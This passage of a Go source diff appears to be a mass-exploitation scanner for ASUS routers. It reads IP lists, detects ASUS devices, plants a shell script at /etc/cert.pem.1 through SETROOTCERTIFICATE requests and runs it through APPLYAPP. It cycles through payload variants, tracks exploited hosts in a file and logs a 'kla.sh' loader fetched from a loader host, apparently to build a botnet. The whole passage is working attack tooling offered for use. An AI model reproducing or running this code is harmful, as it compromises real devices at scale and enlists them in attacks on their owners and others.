+	resp, err := io.ReadAll(conn)
+	if err != nil && err != io.EOF {
+		return err
+	}
+	if len(resp) > 0 && !isHTTPOk(string(resp)) && Debug {
+		fmt.Fprintf(os.Stderr, "[DEBUG] %s SETROOTCERTIFICATE response: %s\n", target, string(resp)[:min(len(resp), 200)])
+	}
+	return nil
+}
+
+func applyApp(target string, methodIndex int, cmdVariant string) error {
+	conn, err := DialTimeout(target)
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+	conn.SetReadDeadline(time.Now().Add(readRespTimeout))
+
+	methodIdx := methodIndex % len(applyAppMethods)
+	request := applyAppMethods[methodIdx](target, cmdVariant)
+	n, err := conn.Write([]byte(request))
+	if err != nil {
+		return err
+	}
+	if n != len(request) {
+		return fmt.Errorf("short write: %d/%d", n, len(request))
+	}
+	// Drain response
+	resp, err := io.ReadAll(conn)
+	if err != nil && err != io.EOF {
+		return err
+	}
+	if len(resp) > 0 && !isHTTPOk(string(resp)) && Debug {
+		fmt.Fprintf(os.Stderr, "[DEBUG] %s APPLYAPP response: %s\n", target, string(resp)[:min(len(resp), 200)])
+	}
+	return nil
+}
+
+func ProcessWithPort(host string, port string) {
+	WaitGroup.Add(1)
+	defer WaitGroup.Done()
+
+	if SkipExploited && isExploited(host) {
+		mu.Lock()
+		Skipped++
+		mu.Unlock()
+		return
+	}
+
+	mu.Lock()
+	Processed++
+	mu.Unlock()
+
+	target := host + ":" + port
+
+	if err := verifyDevice(target); err != nil {
+		return
+	}
+
+	if _, already := processingIPs.LoadOrStore(host, true); already {
+		return
+	}
+
+	mu.Lock()
+	Found++
+	mu.Unlock()
+
+	fmt.Fprintf(os.Stderr, "[+] Found ASUS device: %s\n", target)
+
+	// Try all combos: payload variant × SETROOTCERTIFICATE × APPLYAPP × RC_SERVICE cmd variant
+	comboSize := len(setRootMethods) * len(applyAppMethods) * len(cmd1Variants)
+	maxTries := len(cmdPayloads) * comboSize
+	var lastErr error
+	exploited := false
+
+	for try := 0; try < maxTries && !exploited; try++ {
+		payloadIdx := try % len(cmdPayloads)
+		methodCombo := (try / len(cmdPayloads)) % comboSize
+		setRootMethodIdx := (methodCombo / (len(applyAppMethods) * len(cmd1Variants))) % len(setRootMethods)
+		applyAppMethodIdx := (methodCombo / len(cmd1Variants)) % len(applyAppMethods)
+		cmd1VariantIdx := methodCombo % len(cmd1Variants)
+		cmdVariant := cmd1Variants[cmd1VariantIdx]
+		payload := cmdPayloads[payloadIdx]
+
+		if Debug {
+			fmt.Fprintf(os.Stderr, "[DEBUG] %s: try %d - payload[%d] SETROOT[%d] APPLY[%d] CMD[%d]\n",
+				target, try+1, payloadIdx, setRootMethodIdx, applyAppMethodIdx, cmd1VariantIdx)
+		}
+
+		if try > 0 {
+			fmt.Fprintf(os.Stderr, "[*] %s: Retry %d (payload %d) - writing script...\n", target, try+1, payloadIdx+1)
+		} else {
+			fmt.Fprintf(os.Stderr, "[*] %s: Writing shell script to /etc/cert.pem.1...\n", target)
+		}
+
+		lastErr = setRootCertificate(target, setRootMethodIdx, payload)
+		if lastErr != nil {
+			if Debug {
+				fmt.Fprintf(os.Stderr, "[DEBUG] %s: SETROOTCERTIFICATE failed: %v\n", target, lastErr)
+			}
+			time.Sleep(retryDelay)
+			continue
+		}
+
+		time.Sleep(stepDelay)
+
+		if try > 0 {
+			fmt.Fprintf(os.Stderr, "[*] %s: Retry %d - executing via APPLYAPP...\n", target, try+1)
+		} else {
+			fmt.Fprintf(os.Stderr, "[*] %s: Executing script via APPLYAPP...\n", target)
+		}
+
+		lastErr = applyApp(target, applyAppMethodIdx, cmdVariant)
+		if lastErr != nil {
+			if Debug {
+				fmt.Fprintf(os.Stderr, "[DEBUG] %s: APPLYAPP failed: %v\n", target, lastErr)
+			}
+			time.Sleep(retryDelay)
+			continue
+		}
+
+		// Double-tap: send APPLYAPP again (some devices need second trigger to run script)
+		time.Sleep(500 * time.Millisecond)
+		_ = applyApp(target, (applyAppMethodIdx+1)%len(applyAppMethods), cmdVariant)
+
+		exploited = true
+	}
+
+	if !exploited {
+		processingIPs.Delete(host)
+		fmt.Fprintf(os.Stderr, "[-] %s: Exploit failed after %d tries: %v\n", target, maxTries, lastErr)
+		return
+	}
+
+	mu.Lock()
+	Exploited++
+	mu.Unlock()
+
+	markExploited(host)
+
+	fmt.Fprintf(os.Stderr, "[+] Exploited: %s (kla.sh %s from %s)\n", target, loaderTag, loaderHost)
+}
+
+func Process(target string) {
+	// Parse target (host:port or just host)
+	var host string
+	var ports []string
+	
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		host = parts[0]
+		if len(parts) > 1 {
+			ports = []string{parts[1]}
+		} else {
+			ports = []string{"80"}
+		}
+	} else {
+		host = target
+		// If multi-port enabled, check common ports
+		if MultiPort {
+			ports = commonPorts
+		} else {
+			ports = []string{"80"}
+		}
+	}
+	
+	// Process multiple ports in parallel
+	for _, port := range ports {
+		go ProcessWithPort(host, port)
+	}
+}
+
+func titleWriter() {
+	timeStarted := time.Now()
+
+	for {
+		mu.Lock()
+		processed := Processed
+		found := Found
+		exploited := Exploited
+		skipped := Skipped
+		mu.Unlock()
+
+		fmt.Fprintf(os.Stderr, "[stats] %.0fs processed=%d found=%d exploited=%d skipped=%d routines=%d\n",
+			time.Since(timeStarted).Seconds(),
+			processed,
+			found,
+			exploited,
+			skipped,
+			runtime.NumGoroutine(),
+		)
+
+		time.Sleep(1 * time.Second)
+	}
+}
+
+func main() {
+	var filePath string
+	var noSkip bool
+	flag.StringVar(&Port, "port", "null", "Specify the port to connect to (use 'manual' for stdin IP list + 443 + TLS)")
+	flag.StringVar(&Separator, "separator", ",", "Port separator")
+	flag.BoolVar(&Tls, "tls", false, "Enable TLS for the connection")
+	flag.BoolVar(&MultiPort, "multiport", false, "Enable multi-port scanning (80,443,8080,8443)")
+	flag.StringVar(&filePath, "f", "", "Input file (use '-' or omit for stdin)")
+	flag.StringVar(&ExploitedFile, "exploited", "exploited.txt", "File to track exploited IPs (skip on re-scan)")
+	flag.BoolVar(&noSkip, "no-skip", false, "Disable skipping already exploited IPs")
+	flag.Parse()
+
+	for _, arg := range flag.Args() {
+		switch arg {
+		case "manual":
+			Port = "manual"
+		case "-no-skip", "--no-skip", "no-skip":
+			noSkip = true
+		case "-multiport", "--multiport", "multiport":
+			MultiPort = true
+		case "-tls", "--tls", "tls":
+			Tls = true
+		case "-debug", "--debug", "debug":
+			Debug = true
+		}
+	}
+
+	if noSkip {
+		SkipExploited = false
+	}
+
+	if Port == "manual" {
+		Port = "443"
+		Tls = true
+	}
+
+	loadExploited()
+
+	go titleWriter()
+
+	// Сразу выходим по SIGTERM/SIGINT, не ждём WaitGroup (иначе timeout/watchdog не останавливает скан)
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-sigCh
+		os.Exit(124)
+	}()
+
+	var scanner *bufio.Scanner
+	var file *os.File
+	var err error
+	
+	// Read from file or stdin
+	if filePath == "" || filePath == "-" {
+		scanner = bufio.NewScanner(os.Stdin)
+	} else {
+		file, err = os.Open(filePath)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "Error opening file: %v\n", err)
+			os.Exit(1)
+		}
+		defer file.Close()
+		scanner = bufio.NewScanner(file)
+	}
+
+	for scanner.Scan() {
+		line := scanner.Text()
+		if len(line) == 0 {
+			continue
+		}
+		
+		// Skip headers/comments
+		if strings.HasPrefix(line, "#") || strings.Contains(line, "saddr") || strings.Contains(line, "INFO") {
+			continue
+		}
+		
+		if Port == "null" || Port == "listen" {
+			go Process(strings.ReplaceAll(line, Separator, ":"))
+		} else {
+			go Process(line + ":" + Port)
+		}
+	}
+	
+	if err := scanner.Err(); err != nil {
+		fmt.Fprintf(os.Stderr, "Error reading input: %v\n", err)
+	}
+
+	time.Sleep(10 * time.Second)
+	WaitGroup.Wait()
+}
